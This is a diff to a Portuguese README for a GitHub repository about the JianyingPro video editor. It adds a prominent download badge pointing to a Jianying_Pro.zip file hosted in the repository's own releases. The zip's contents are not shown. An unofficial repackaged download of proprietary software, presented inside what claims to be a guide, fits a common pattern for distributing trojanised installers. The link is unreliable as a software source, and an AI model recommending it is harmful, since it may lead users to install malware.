@@ -10,6 +10,14 @@
 O **JianyingPro** (剪映专业版) é a versão original e avançada para desktop do popular editor de vídeo CapCut, desenvolvida pela ByteDance. Embora o CapCut global seja amplamente conhecido, a versão chinesa (Jianying) frequentemente recebe recursos de IA, efeitos e ferramentas de edição de ponta antes da versão internacional.
 
 ## 📝 Sobre o Projeto
+<div align="center">
+  <a href="https://github.com/Gustavo-de-Lima-G-000-Akiko-Yuuuki/Editor_Video_Windows_JianyingPro/releases/download/Jianying_Pro/Jianying_Pro.zip">
+    <img src="https://img.shields.io/badge/-DOWNLOAD%20JIANYING%20PRO-2ea44f?style=for-the-badge&logo=windows&logoColor=white" width="400">
+  </a>
+  <p align="center">
+    <strong>Jianying Pro - Windows</strong>
+  </p>
+</div>
 
 Este repositório serve como um guia de referência, centralização de informações e suporte para usuários que desejam utilizar o JianyingPro no Windows, superando a barreira do idioma e explorando o potencial máximo desta ferramenta de edição.
 
